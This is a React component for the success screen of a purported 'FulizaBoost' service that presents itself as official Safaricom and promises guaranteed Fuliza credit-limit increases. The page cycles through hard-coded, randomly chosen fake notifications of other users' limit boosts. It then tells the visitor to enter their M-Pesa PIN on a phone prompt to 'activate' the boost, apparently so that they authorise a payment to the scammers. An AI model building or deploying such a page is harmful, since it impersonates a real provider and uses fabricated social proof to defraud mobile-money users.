import { useNavigate, useLocation } from "react-router-dom";
import "../styles/Success.css";
import { useEffect, useState } from "react";

const Success = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const selectedLimit = location.state || JSON.parse(sessionStorage.getItem("selectedLimit") || "{}");
    const notifications = [
    { phone: "0708****85", limit: 45000 },
    { phone: "0712****34", limit: 30000 },
    { phone: "0722****91", limit: 25000 },
    { phone: "0733****56", limit: 35000 },
    { phone: "0745****23", limit: 20000 },
    { phone: "0756****78", limit: 15000 },
    { phone: "0767****12", limit: 40000 },
    { phone: "0778****45", limit: 25000 },
    { phone: "0789****67", limit: 30000 },
    { phone: "0791****89", limit: 45000 },
  ];
  
   const [currentNotification, setCurrentNotification] = useState(notifications[0]);
    const [showNotification, setShowNotification] = useState(true);
  
    // Change notification every 4 seconds
      useEffect(() => {
        const interval = setInterval(() => {
          setShowNotification(false);
          
          setTimeout(() => {
            const randomIndex = Math.floor(Math.random() * notifications.length);
            setCurrentNotification(notifications[randomIndex]);
            setShowNotification(true);
          }, 300);
        }, 4000);
    
        return () => clearInterval(interval);
      }, []);

  return (
    <main className="success-container">
      {/* HEADER */}
      <div className="badge">● SAFARICOM OFFICIAL</div>

      <h1 className="success-title">FulizaBoost</h1>
      <p className="subtitle">
        Instant Limit Increase • Guaranteed Approval
      </p>

      {/* SUCCESS ICON */}
      <div className="success-icon-wrapper">
         {/* NOTIFICATION OVERLAY */}
      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
        <div className="notification-icon"></div>
        <div className="notification-content">
          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
          <div className="notification-time">• just now</div>
        </div>
      </div>
        
      </div>

      {/* SUCCESS MESSAGE */}
      <h2 className="success-heading">Success!</h2>
      <p className="success-message">
        Your boost of <span className="amount-highlight">Ksh {selectedLimit.amount?.toLocaleString() || "30,000"}</span> has been successfully processed.
      </p>

      {/* INSTRUCTION BOX */}
      <div className="instruction-box">
        <div className="warning-icon">⚠️</div>
        <div className="instruction-text">
          <strong>Final Step:</strong> Enter your M-Pesa PIN on the prompt currently showing on your phone to activate your new limit.
        </div>
      </div>

      {/* RETURN BUTTON */}
      <button 
        className="return-btn"
        onClick={() => navigate("/")}
      >
        Return to Dashboard
      </button>
    </main>
  );
};

export default Success;